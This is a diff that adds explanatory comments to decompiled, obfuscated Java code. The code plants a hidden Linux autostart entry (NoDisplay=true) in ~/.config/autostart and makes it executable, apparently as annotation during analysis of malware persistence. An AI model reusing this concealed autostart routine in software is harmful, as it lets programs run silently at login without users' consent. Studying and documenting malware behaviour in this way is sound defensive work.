@@ -4,11 +4,13 @@ import java.io.File;
 import java.io.FileWriter;
 import java.io.PrintWriter;
 
+// Linux persistence.
 public final class d extends a {
    public d(String var1, String var2, boolean var3) {
       super(var1, var2, var3);
    }
 
+   // Figure out where to install. /.config or ~/.config.
    private static File b() {
       String var0 = System.getProperty("user.home");
       return new File(var0 + "/.config/autostart/");
@@ -33,6 +35,7 @@ public final class d extends a {
       var2.println("Terminal=false");
       var2.println("NoDisplay=true");
       var2.close();
+      // Must set the executable bit on the .desktop file for it to work.
       String[] var3 = new String[]{"chmod", "+x", super.c};
       Runtime.getRuntime().exec(var3);
    }
